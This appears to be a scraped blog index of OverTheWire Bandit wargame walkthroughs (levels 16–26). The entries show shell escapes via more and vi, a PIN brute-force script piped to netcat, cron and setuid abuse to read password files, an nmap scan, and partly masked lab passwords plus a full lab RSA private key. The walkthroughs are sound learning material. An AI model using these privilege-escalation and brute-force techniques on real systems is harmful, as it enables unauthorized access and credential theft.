vi(1) if neither VISUAL nor EDITOR is defined.The problem now is that more always closes thus we cannot use the v command.To solve this we need the message that is displayed to be bigger then the screen.This can be done through a combination of resizing the terminal window and increasing the font sizeTerminal Window reized small and text font increased +--------------------------------------------+| _ _ _ _ ___ __ || | | | (_) | |__ \\ / / || | |__ __ _ _ __ __| |_| |_ ) / /_ || | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ || | |_) | (_| | | | | (_| | | |_ / /| (_) | ||--More--(83%) |+--------------------------------------------+With the more program stopped from completing we can now use v to open a vi editor. 1 _ _ _ _ ___ __ 2 | | | (_) | |__ \\ / / 3 | |__ __ _ _ __ __| |_| |_ ) / /_ 4 | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\&lt;RO] [dec= 95] [hex=5F] [pos=0001:0003][16% of 6]\"~/text.txt\" [readonly] 6L, 258CNow we are in a vi editor we can use the :set shell command to change the shell and give us more control. 1 _ _ _ _ ___ __ 2 | | | (_) | |__ \\ / / 3 | |__ __ _ _ __ __| |_| |_ ) / /_ 4 | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\~text.txt[RO] [dec= 95] [hex=5F] [pos=0001:0003][16% of 6]:set shell=/bin/bashNow still in vi we run :shell to start the bash shell. 1 _ _ _ _ ___ __ 2 | | | (_) | |__ \\ / / 3 | |__ __ _ _ __ __| |_| |_ ) / /_ 4 | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\~text.txt[RO] [dec= 95] [hex=5F] [pos=0001:0003][16% of 6]:shellbandit26@bandit:~$Now we have a bash shell as bandit26 we can read the password to make it easier to login to this level in future.bandit26@bandit:~$ cat /etc/bandit_pass/bandit265czgV9##########################" }, { "title": "Overthewire Bandit Level 24-> 25", "url": "/posts/bandit24-25/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2022-01-07 22:05:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 24 -&gt; 25Level GoalA daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 23 -&gt; 24.username: bandit24ssh bandit24@bandit.labs.overthewire.org -p 2220For this challenge we need to send a password to a specific port on localhost, we have done this before on previous levels but the difference this time is that we need to send a 4 digit pincode with the password.Unfortunately we do not know what the pincode is so we will need to try all possible combinations until we get the right one.The first thing to do is to connect to port 30002 and see what it is doing.We can use netcat to connect to port 30002 on localhost.bandit24@bandit:~$ nc localhost 30002I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.UoMYTr########################## 1234Wrong! Please enter the correct pincode. Try again.Fail! You did not supply enough data. Try again.UoMYTr 124Wrong! Please enter the correct current password. Try again.bandit24@bandit:~$What we can see is that the daemon running on port 30002 wants the data entered in a specific format.&lt;BANDIT24 PASSWORD&gt; &lt;4 DIGIT PIN&gt;The daemon first checks if the password is correct before checking the pincode.If the password is incorrect we get a message stating that the password was incorrect. The pincode is not checked.If the password is correct and the pincode is incorrect we get a different message stating the pincode is incorrect.Since we are using the same password used to login to this level we should not see the password incorrect message.The daemon wants a 4 digit pincode so we need to check all pincodes from 0000 to 9999 to find the correct one.Doing this by hand would take a long time (10,000 pincodes to check). It is more efficient to create a program to do this for us.First lets create a directory in /tmp to work frombandit24@bandit:~$ mkdir /tmp/work_dirbandit24@bandit:~$ cd /tmp/work_dirbandit24@bandit:/tmp/work_dir$Now to create a bash script to create all 10,000 password pincode combinations we need to test.I used vim to create a file try_passwords.sh and wrote this code into it.#!/bin/bashfor i in {000..9999}do echo UoMYTr************************** $i doneThe code will create all 4 digit pincodes we need.Next we need to give the file execute permissionsbandit24@bandit:/tmp/work_dir$ chmod +x try_password.shNow all thats left is to run the bash script and send it’s output to netcat.This will run for a while as it is trying 10,000 pincodes but eventually you will see the correct message and get the password for bandit25.bandit24@bandit:/tmp/work_dir$ ./try_pass.sh | nc localhost 30002I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.Wrong! Please enter the correct pincode. Try again.Wrong! Please enter the correct pincode. Try again.Wrong! Please enter the correct pincode. Try again.Correct!The password of user bandit25 is uNG9O5##########################Exiting.bandit24@bandit:/tmp/work_dir$" }, { "title": "Overthewire Bandit Level 23-> 24", "url": "/posts/bandit23-24/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-12-06 00:05:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 23 -&gt; 24Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.NOTE: This level requires you to create your own first shell-script. This is a very bcd ig step and you should be proud of yourself when you beat this level!NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…WalkthroughLogin to the server using the password obtained from the previous level Bandit level 22 -&gt; 23.username: bandit23ssh bandit23@bandit.labs.overthewire.org -p 2220This level is cron job related like the previous few levels so first thing to do is check the /etc/cron.d directory.bandit23@bandit:~$ cd /etc/cron.dbandit23@bandit:/etc/cron.d$ lscronjob_bandit15_root cronjob_bandit22 cronjob_bandit24cronjob_bandit17_root cronjob_bandit23 cronjob_bandit25_rootThis time the cronjob we need to investigate is cronjob_bandit24.bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullThe cronjob is running the script cronjob_bandit24.sh as user bandit24 every minute. So let’s see what it is doing.bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho \"Executing and deleting all scripts in /var/spool/$myname:\"for i in * .*;do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i- fi rm -f ./$i fidoneThe bash script is doing: Running whoami and storing the value in myname (bandit24 in this instance) Changing into the /var/spool/bandit24 directory for each file in /var/spool/bandit24 (files and hidden files) if file is not . (current directory) and file is not ..(parent directory) print ‘Handling file’ to the screen Assign the name of the owner of the file to a variable “owner” if “owner” equals ‘bandit23’ wait 60 seconds and then run the file delete file Since we are bandit23, any file we create and place into /var/spool/bandit24 will be run as user bandit24. The file is deleted after being run.We can create a script to read the password file /etc/bandit_pass/bandit24 and save it in a new file elsewhere.Create a file named get_bandit24_pass in /tmp.Write this line inside the file.cat /etc/bandit_pass/bandit24 &gt; /tmp/pass_for_bandit24Give the file execute permission so it can be run and then copy it to the /var/spool/bandit24 directory.bandit23@bandit:/tmp$ chmod +x get_bandit24_passbandit23@bandit:/tmp$ cp get_bandit_pass /var/spool/bandit24/Now wait 60 seconds and check for a file named pass_for_bandit24 in tmp.It will contain the password for bandit24.bandit23@bandit:/tmp$ cat pass_for_bandit24 UoMYTr##########################" }, { "title": "Overthewire Bandit Level 22-> 23", "url": "/posts/bandit22-23/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-19 00:25:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 22 -&gt; 23Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 21 -&gt; 22.username: bandit22ssh bandit22@bandit.labs.overthewire.org -p 2220Like the previous level we are looking for a job in the /etc/cron.d directory.bandit22@bandit:~$ cd /etc/cron.dbandit22@bandit:/etc/cron.d$ ls -ltotal 24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 2020 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_rootLast time we used cronjob_bandit22 so this time we use cronjob_bandit23.bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:/etc/cron.d$ It looks like /usr/bin/cronjob_bandit23.sh is running each minute and with user bandit23's permissions.We go to /usr/bin/cronjob_bandit23.sh and read what it is doing.#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetLet’s take the script line by line: #!/bin/bash Tells linux how to run the file myname=$(whoami) Run the whoami command and store the value in myname variable mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo I am user $myname Print text to the terminal screen md5sum Create a hash digest (unique identifier) of the text cut -d ' ' -f 1 Split the text up by space and return the first part. Store the result in the mytarget variable echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" Print text to the screen informing user what is happening cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget Finally copying a password from /etc/bandit_pass to a file in /tmp.If we run the script now myname will contain bandit22. It will then create a hash and copy the password stored in /etc/bandit_pass/bandit22 to a file in /tmp using the hash as its name.bandit22@bandit:~$ /usr/bin/cronjob_bandit23.shCopying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3bandit22@bandit:~$ cat /tmp/8169b67bd894ddbb4412f91573b38db3Yk7owG##########################bandit22@bandit:~$Bandit22's password is something we already know. When the cronjob runs the bash script it is doing so as user bandit23, so whoami would return bandit23 and the script would then save bandit23's password in a file in /tmp.We can find out what the file name is by running this line of the bash script.echo I am user $myname | md5sum | cut -d ' ' -f 1)When we replace $myname with bandit23 we get the name of the file in /tmp containing the password.bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udX##########################" }, { "title": "Overthewire Bandit Level 21-> 22", "url": "/posts/bandit21-22/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-18 23:48:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 21 -&gt; 22Level GoalA program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 20 -&gt; 21.username: bandit21ssh bandit21@bandit.labs.overthewire.org -p 2220For this challenge we need to find the cron jobs that are running, these are located in /etc/cron.d. Let’s change the directory to /etc/cron.d and see what files are stored there.bandit21@bandit:~$ cd /etc/cron.dbandit21@bandit:/etc/cron.d$ ls -ltotal 24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit15_root-rw-r--r-- 1 root root 62 Jul 11 2020 cronjob_bandit17_root-rw-r--r-- 1 root root 120 May 7 2020 cronjob_bandit22-rw-r--r-- 1 root root 122 May 7 2020 cronjob_bandit23-rw-r--r-- 1 root root 120 May 14 2020 cronjob_bandit24-rw-r--r-- 1 root root 62 May 14 2020 cronjob_bandit25_rootbandit21@bandit:/etc/cron.d$There are multiple files but the one we need for this challenge is cronjob_bandit22. Let’s read what it is doing.bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullAccording to cronjob_bandit22 user bandit22 is running the script /usr/bin/cronjob_bandit22.sh every minute.What is cronjob_bandit22.sh doing ?bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvThe bash script is giving read permission to everyone and only the owner has write permission to the file /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv. It then writing the contents of /etc/bandit_pass/bandit22 to that file.So it is writing the password we need into a file a new file.We cannot read /etc/bandit_pass/bandit22 as bandit21 does not have permission but the cronjob has written the password to a file we do have read permissions to. All we need to do is read the file the cronjob created.bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owG########################## " }, { "title": "Overthewire Bandit Level 20-> 21", "url": "/posts/bandit20-21/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-18 23:36:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 20 -&gt; 21Level GoalThere is a setuid binary in the homedirectory that does the following:it makes a connection to localhost on the port you specify as a commandline argument.It then reads a line of text from the connection and compares it to the password in the previous level (bandit20).If the password is correct, it will transmit the password for the next level (bandit21).NOTE: Try connecting to your own network daemon to see if it works as you thinkWalkthroughLogin to the server using the password obtained from the previous level Bandit level 19 -&gt; 20.username: bandit20ssh bandit20@bandit.labs.overthewire.org -p 2220Like the previous level we will be using a setuid binary file. We can run it to find out how to use it correctly.bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. bandit20@bandit:~$So suconnect will accept a port number as an argument and try to receive the password from a TCP connection on the port, if the password is correct suconnect will send the new password to the back as a reply.One problem is that currently there is nothing for suconnect to connect to. The challenge is for us to create a TCP connection for suconnect to connect to.We can do this using netcat (nc). We can open a listener with netcat on a specific port and on a second terminal instance we run the suconnect binary. Once the connection is made we send the password using netcat and suconnect should reply with the new password.Terminal 1bandit20@bandit:~$ nc -l -p 4444-------------------------------------------------Terminal 2bandit20@bandit:~$ ./suconnect 4444On Terminal 1 we have run netcat with the -l for listening and -p for port number. On Terminal 2 we ran the suconnect with the same port number used for netcat.Terminal 1bandit20@bandit:~$ nc -lp 4444GbKksE##########################gE269g##########################bandit20@bandit:~$ ----------------------------------------------------Terminal 2bandit20@bandit:~$ ./suconnect 4444Read: GbKksE########################## Password matches, sending next passwordbandit20@bandit:~$AlternativeAlternatively we can create the TCP server using a python script in place of using netcat.In the python file we specify the host 127.0.0.1, port 4444 and the password to be sent. When the script is run it will open a TCP connection on port 4444 and wait for something to connect, when it receives the connection from suconnect the python script will send the password and receive the new password back.#!/usr/bin/env python3import socketHOST = '127.0.0.1' # localhostPORT = 4444 # use the same port number with suconnect# Password for bandit20PASSWORD = 'GbKksE##########################' with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((HOST, PORT)) s.listen() conn, addr = s.accept() with conn: conn.sendall(bytes(PASSWORD, \"utf-8\")) data = conn.recv(1024) print(data.decode('utf-8'))Again we will need 2 terminals open one to run the python script and the other to run suconnect.Terminal 1bandit20@bandit:~$ python3 tcp_server.pygE269g##########################bandit20@bandit:~$----------------------------------------------Terminal 2bandit20@bandit:~$ ./suconnect 4444Read: GbKksE########################## Password matches, sending next passwordbandit20@bandit:~$" }, { "title": "Overthewire Bandit Level 19 -> 20", "url": "/posts/bandit19-20/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-17 23:59:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 19 -&gt; 20Level GoalTo gain access to the next level, you should use the setuid binary in the homedirectory.Execute it without arguments to find out how to use it.The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 18 -&gt; 19.username: bandit19ssh bandit19@bandit.labs.overthewire.org -p 2220After logging in we check what is in the home directory. We can see a single file bandit20-do.Running file on it tells us it is an executable file.bandit19@bandit:~$ lsbandit20-dobandit19@bandit:~$ file bandit20-do bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not strippedWe are told from the Level Goal that the file is a setuid file. A setuid (set user id) file allows a user to run commands with the permissions of the file owner or group.Looking at the file owner and group we can see the owner is bandit20 and group is bandit19. Going by the who the file owner is and file’s name we can assume running bandit20-do will allow us to run commands as bandit20.bandit19@bandit:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rwsr-x--- 1 bandit20 bandit19 7296 May 7 2020 bandit20-do-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit19@bandit:~$When we run the file it tells us how to use it correctly. The example given is the id command.id is used to see what the current user and group ids are.When we run id by itself we can see that uid, gid and group are bandit19.However when we run ./bandit-20 id we get a new id, the euid(effective user id) is set to bandit20.This means that the id command was run as user bandit20.bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ iduid=11019(bandit19) gid=11019(bandit19) groups=11019(bandit19)bandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)Now that we can run commands as bandit20 we can simply read bandit20 password directly from /etc/bandit_pass/bandit20.bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksE##########################" }, { "title": "Overthewire Bandit Level 18 -> 19", "url": "/posts/bandit18-19/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-17 23:43:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 18 -&gt; 19Level GoalThe password for the next level is stored in a file readme in the home directory.Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 17 -&gt; 18.username: bandit18ssh bandit18@bandit.labs.overthewire.org -p 2220When we log into bandit18 we get the usual messages we have seen on previous levels of Bandit but before we can enter any commands we see a ByeBye ! message and then the connection is closed.ssh bandit18@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org\\'s password: Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.orgWelcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /usr/local/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay!Byebye !Connection to bandit.labs.overthewire.org closed.So it appears we cannot enter any commands as the .bashrc runs after we login and it logs us out immediately.So what can we do ? Well we know where the file with password is located, according to the description it is located in the home directory./home/bandit18/readmeWe need a way to read the file since we can’t stay logged in.When checking the man page for SSH we can see it is not just for logging into remote machines. The description says that SSH can also be used to execute commands on remote machines instead of logging in.SSH DESCRIPTIONssh (SSH client) is a program for logging into a remote machine and for executing commands on a remote machine. It is intended to provide secure encrypted communications between two un‐trusted hosts over an insecure network. X11 connections, arbitrary TCP ports and UNIX-domain sockets can also be forwarded over the secure channel.ssh connects and logs into the specified destination, which may be specified as either [user@]hostname or a URI of the form ssh://[user@]hostname[:port]. The user must prove his/her identity to the remote machine using one of several methods (see below).If a command is specified, it is executed on the remote host instead of a login shell.This is exactly the functionalty we need to read the readme file.Now we can test this by passing the ls command to SSH.ssh bandit18@bandit.labs.overthewire.org -p 2220 \"ls\" This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password: readmeNow we have verified that commands can be passed to SSH and know that readme is located in home directory we pass cat readme to SSH to read the file and get the password for bandit19.ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat readme\"This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password:IueksS##########################" }, { "title": "Overthewire Bandit Level 17 -> 18", "url": "/posts/bandit17-18/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-17 23:37:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 17 -&gt; 18Level GoalThere are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.newNOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19WalkthroughLogin to the server using the password obtained from the previous level Bandit level 16 -&gt; 17.username: bandit17ssh bandit17@bandit.labs.overthewire.org -p 2220In this level we are given 2 files full of text that look like passwords.The password we are looking for is in passwords.new and it is the only line that is different to passwords.old file.Checking how many lines in each file tells us there is 100 lines. Too many to check by hand.bandit17@bandit:~$ wc -l passwords.new 100 passwords.newbandit17@bandit:~$ wc -l passwords.old 100 passwords.oldLuckily linux has a tool for comparing files line by line.That tool is diff.Diff takes 2 inputs and outputs the line numbers and the differences between them.bandit17@bandit:~$ diff passwords.new passwords.old42c42&lt; kfBf3e##########################---&gt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03biibandit17@bandit:~$" }, { "title": "Overthewire Bandit Level 16 -> 17", "url": "/posts/bandit16-17/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-17 23:23:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 16 -&gt; 17Level GoalThe credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 15 -&gt; 16.username: bandit16ssh bandit16@bandit.labs.overthewire.org -p 2220This level has multiple steps to find the password. Find what ports are open between 31000 and 32000 Find which ports are using SSL encryption Get next password by sending current password to the correct port.We use a network mapper to check each port for their open/closed status and what service is running on the ports.The network mapper we will use is nmap and it was developed by the same people as the ncat tool used in the previous level.Nmap can check what service is running on ports as well as whether they are open or closed.The nmap command to find open ports between 31000 and 32000 and what service is running isnmap -sV -p 31000-32000 localhost -sV Version detection -p 31000-320000 only check ports 31000 - 320000 localhost the target for the network mapping scanRunning the command will give us this output.bandit16@bandit:~$ nmap -sV -p 31000-32000 localhostStarting Nmap 7.40 ( https://nmap.org ) at 2021-09-23 00:58 CESTNmap scan report for localhost (127.0.0.1)Host is up (0.00031s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION31046/tcp open echo31518/tcp open ssl/echo31691/tcp open echo31790/tcp open ssl/unknown31960/tcp open echo1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=9/23%Time=614BB50A%P=x86_64-pc-linux-gSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cuSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20theSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20PleaSF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\xSF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20SF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20PleaseSF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"WSF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%rSF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cSF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20theSF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20PlSF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptionsSF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20passwordSF:\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 89.60 secondsbandit16@bandit:~$The scan shows us that there is 5 ports open and that only 2 of them are using SSL.31046/tcp open echo31518/tcp open ssl/echo31691/tcp open echo31790/tcp open ssl/unknown31960/tcp open echoPort 31518 will repeat anything we send it back to us.The port we need is port 31790.Like the previous levels we use ncat to open a SSL encrypted connection to port 31790 on localhost and send the password for the current level.bandit16@bandit:~$ ncat --ssl localhost 31790 cluFn7w##########################Correct!-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77p